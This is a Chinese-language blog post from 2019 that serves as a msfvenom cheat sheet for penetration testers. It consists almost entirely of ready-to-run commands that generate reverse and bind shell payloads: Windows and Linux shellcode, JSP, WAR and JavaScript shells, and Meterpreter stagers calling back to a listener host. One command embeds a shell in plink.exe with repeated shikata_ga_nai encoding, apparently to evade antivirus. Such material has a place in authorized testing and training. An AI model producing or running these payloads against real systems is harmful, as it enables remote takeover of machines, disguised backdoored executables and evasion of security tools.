---
layout:     post
title:      MSFVENOM SHELLCODE生成
subtitle:   MSFVENOM 生成 SHELLCODE
date:       2019-04-26
author:     BY
header-img: img/post-bg-hacker.jpg
catalog: true
tags:
    - msf
    - 渗透测试
---


# MSFVENOM SHELLCODE生成

## 通用Shellcode

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e generic/none
```

## Windows反向TCP Shell（Shellcode x86）

如果有效负载大小没有问题并且您不能确定错误的字符，请仅使用此代码：

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"
```

## 嵌入在“ plink.exe”中的Windows反向TCP Shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o burmat_embedded.exe
```

## 绑定Shell Shellcode

我不经常使用绑定外壳，但是有时打开端口比发出反向连接更容易：

```
msfvenom -p windows/shell_bind_tcp RHOST=10.11.11.11 LPORT=1337 -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f python
```

# 反向壳

奇形怪状的反向弹壳会使您绊倒。那些“等等，我以前做过吗？” 片刻。就像当您看到Tomcat以默认凭据或ColdFusion站点运行时（操我...）

## JSP反向外壳

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o burmat.jsp
```

## JavaScript反向Shell

如果要攻击Windows主机：

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f js_le -e generic/none
```

如果要攻击Linux主机：

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
```

## WAR（Java）反向外壳

```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o burmat.war
```

# 仪表反向有效载荷：

不要只是复制和粘贴-学习和理解语法。这些都是针对x86机器的，因此只需将其交换到x64即可满足您的需求。

## Windows Meterpreter有效负载

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o burmat.exe
```

## Windows Meterpreter反向HTTPS有效负载（x86）

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -b '\x00' -f exe -o burmat.exe
```

## Linux Meterpreter Stager

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.11 LPORT=443 -f elf -o burmat
```
